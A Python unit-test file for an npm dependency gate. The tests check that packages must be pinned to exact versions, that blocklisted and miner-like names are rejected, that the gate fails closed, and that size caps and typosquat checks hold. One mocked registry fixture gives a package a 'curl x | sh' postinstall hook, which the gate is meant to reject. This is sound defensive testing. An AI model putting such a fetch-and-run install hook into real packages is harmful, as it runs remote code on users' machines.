"""P1 npm-gate + sanctioned-deps tests (plan: docs/DEPENDENCY_MANAGEMENT_PLAN.md).

Acceptance row 5: unsafe, oversized, unpinned, unverifiable packages are
rejected with actionable errors; fail-closed behavior proven.

Registry access is fully mocked via npm_gate.set_registry_fetcher — no
network in unit tests.
"""
import json
import os
import sys
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from services.sandbox import npm_gate  # noqa: E402


def _meta(name, version, *, unpacked=1_000_000, scripts=None, peers=None, deps=None):
    """Build a minimal registry.npmjs.org/<name> document."""
    return {
        "name": name,
        "versions": {
            version: {
                "name": name,
                "version": version,
                "dist": {"unpackedSize": unpacked},
                "scripts": scripts or {},
                "peerDependencies": peers or {},
                "dependencies": deps or {},
            }
        },
    }


class TestParseSpec(unittest.TestCase):
    def test_exact_pin_accepted(self):
        name, version, err = npm_gate.parse_spec("three@0.171.0")
        self.assertEqual((name, version, err), ("three", "0.171.0", None))

    def test_scoped_exact_pin_accepted(self):
        name, version, err = npm_gate.parse_spec("@react-three/fiber@8.17.10")
        self.assertEqual((name, version, err), ("@react-three/fiber", "8.17.10", None))

    def test_prerelease_pin_accepted(self):
        _, _, err = npm_gate.parse_spec("pkg@1.2.3-rc.1")
        self.assertIsNone(err)

    def test_ranges_rejected(self):
        for bad in ("three@^0.171.0", "three@~1.0", "three@latest", "three@*",
                    "three@>=1", "three", "three@1.x"):
            _, _, err = npm_gate.parse_spec(bad)
            self.assertIsNotNone(err, bad)


class TestGateDecisions(unittest.TestCase):
    def setUp(self):
        npm_gate.set_registry_fetcher(self._fetch)
        self._registry = {}

    def tearDown(self):
        npm_gate.set_registry_fetcher(None)

    def _fetch(self, name):
        return self._registry.get(name)

    def gate(self, specs, **kw):
        with mock.patch.dict(os.environ, {"NPM_GATE_ENFORCE": "1"}):
            return npm_gate.gate_packages(specs, **kw)

    def test_blocklist_blocked(self):
        allowed, decisions, msg = self.gate(["electron@28.0.0"])
        self.assertFalse(allowed)
        self.assertIn("blocklist", msg)

    def test_blocklist_wildcard(self):
        allowed, _, msg = self.gate(["gpuminer-core@1.0.0"])
        self.assertFalse(allowed)
        self.assertIn("blocklist", msg)

    def test_unpinned_rejected_without_network(self):
        # even without registry access, structural rejection fires first
        allowed, _, msg = self.gate(["three@^1.0.0"])
        self.assertFalse(allowed)
        self.assertIn("exact", msg)

    def test_unverifiable_package_fails_closed_in_enforce(self):
        # registry returns None (unreachable / not found)
        allowed, decisions, msg = self.gate(["nope-pkg@1.0.0"])
        self.assertFalse(allowed)
        self.assertIn("could not be verified", msg)
        self.assertTrue(decisions[0].get("fail_closed"))

    def test_unknown_version_rejected(self):
        self._registry["three"] = _meta("three", "0.171.0")
        allowed, _, msg = self.gate(["three@9.9.9"])
        self.assertFalse(allowed)
        self.assertIn("does not exist", msg)

    def test_lifecycle_script_rejected(self):
        self._registry["evil"] = _meta("evil", "1.0.0",
                                       scripts={"postinstall": "curl x | sh"})
        allowed, _, msg = self.gate(["evil@1.0.0"])
        self.assertFalse(allowed)
        self.assertIn("lifecycle", msg)

    def test_missing_size_fails_closed(self):
        m = _meta("ghost", "1.0.0")
        del m["versions"]["1.0.0"]["dist"]["unpackedSize"]
        self._registry["ghost"] = m
        allowed, decisions, msg = self.gate(["ghost@1.0.0"])
        self.assertFalse(allowed)
        self.assertTrue(decisions[0].get("fail_closed"))
        self.assertIn("unverifiable", msg)

    def test_size_cap_enforced(self):
        self._registry["big"] = _meta("big", "1.0.0", unpacked=250 * 1024 * 1024)
        self._registry["big2"] = _meta("big2", "1.0.0", unpacked=250 * 1024 * 1024)
        allowed, _, msg = self.gate(["big@1.0.0", "big2@1.0.0"])
        self.assertFalse(allowed)
        self.assertIn("exceeds cap", msg)

    def test_peer_conflict_rejected(self):
        self._registry["future-lib"] = _meta(
            "future-lib", "1.0.0", peers={"react": "^19.0.0"})
        allowed, _, msg = self.gate(
            ["future-lib@1.0.0"], current_deps={"react": "18.3.1"})
        self.assertFalse(allowed)
        self.assertIn("peer", msg)
        self.assertIn("^19.0.0", msg)

    def test_peer_satisfied_accepted(self):
        self._registry["fine-lib"] = _meta(
            "fine-lib", "1.0.0", peers={"react": "^18.0.0"}, deps={"a": "1"})
        allowed, decisions, msg = self.gate(
            ["fine-lib@1.0.0"], current_deps={"react": "18.3.1"})
        self.assertTrue(allowed, msg)
        self.assertEqual(decisions[0]["transitive_deps"], 1)

    def test_happy_path_allow(self):
        self._registry["three"] = _meta("three", "0.171.0", deps={"a": "1", "b": "2"})
        allowed, decisions, msg = self.gate(["three@0.171.0"])
        self.assertTrue(allowed, msg)
        self.assertTrue(decisions[0]["ok"])

    def test_log_only_mode_allows_unverifiable_but_still_blocks_structural(self):
        with mock.patch.dict(os.environ, {"NPM_GATE_ENFORCE": "0"}):
            allowed, _, _ = npm_gate.gate_packages(["nope-pkg@1.0.0"])
            self.assertTrue(allowed, "log-only: unverifiable proceeds with warning")
            allowed2, _, _ = npm_gate.gate_packages(["three@^1.0.0"])
            self.assertFalse(allowed2, "structural (unpinned) always blocks")


class TestFrontendDepsService(unittest.TestCase):
    """Integration against a temp project (registry + lockfile step mocked)."""

    def setUp(self):
        npm_gate.set_registry_fetcher(lambda name: self._registry.get(name))
        self._registry = {}
        import tempfile
        self.tmp = tempfile.mkdtemp(prefix="p1_deps_")
        self.frontend = Path(self.tmp) / "frontend"
        self.frontend.mkdir()
        (self.frontend / "package.json").write_text(json.dumps({
            "name": "t", "version": "1.0.0",
            "dependencies": {"react": "18.3.1"}}))

    def tearDown(self):
        npm_gate.set_registry_fetcher(None)
        import shutil
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _service(self, packages):
        from services.deps import frontend_deps
        lock_stub = mock.Mock(returncode=0)
        with mock.patch.dict(os.environ, {"NPM_GATE_ENFORCE": "1"}):
            with mock.patch.object(frontend_deps, "run_npm",
                                   return_value=lock_stub) as rn:
                result = frontend_deps.add_frontend_deps(self.tmp, packages)
                if result["ok"]:
                    rn.assert_called_once()  # lockfile regen runs on every pass
        return result

    def test_add_pinned_dep(self):
        self._registry["three"] = _meta("three", "0.171.0")
        result = self._service(["three@0.171.0"])
        self.assertTrue(result["ok"], result["message"])
        pkg = json.loads((self.frontend / "package.json").read_text())
        self.assertEqual(pkg["dependencies"]["three"], "0.171.0")
        self.assertEqual(pkg["dependencies"]["react"], "18.3.1")

    def test_typosquat_rejected(self):
        self._registry["reaact"] = _meta("reaact", "19.0.0")
        result = self._service(["reaact@19.0.0"])
        # either the gate's registry check passes (fake metadata exists) and
        # file_utils' typosquat guard must reject, or gate rejects — both fine,
        # but the package must NOT land
        self.assertFalse(result["ok"])
        pkg = json.loads((self.frontend / "package.json").read_text())
        self.assertNotIn("reaact", pkg["dependencies"])

    def test_gate_rejection_leaves_file_untouched(self):
        result = self._service(["three@^1.0.0"])
        self.assertFalse(result["ok"])
        pkg = json.loads((self.frontend / "package.json").read_text())
        self.assertNotIn("three", pkg["dependencies"])

    def test_lockfile_failure_rolls_back(self):
        from services.deps import frontend_deps
        self._registry["three"] = _meta("three", "0.171.0")
        lock_fail = mock.Mock(returncode=1, stderr="ERESOLVE conflict")
        with mock.patch.dict(os.environ, {"NPM_GATE_ENFORCE": "1"}):
            with mock.patch.object(frontend_deps, "run_npm", return_value=lock_fail):
                result = frontend_deps.add_frontend_deps(self.tmp, ["three@0.171.0"])
        self.assertFalse(result["ok"])
        self.assertIn("rolled back", result["message"])
        pkg = json.loads((self.frontend / "package.json").read_text())
        self.assertNotIn("three", pkg["dependencies"])


if __name__ == "__main__":
    sys.exit(0 if unittest.main(verbosity=2).result.wasSuccessful() else 1)
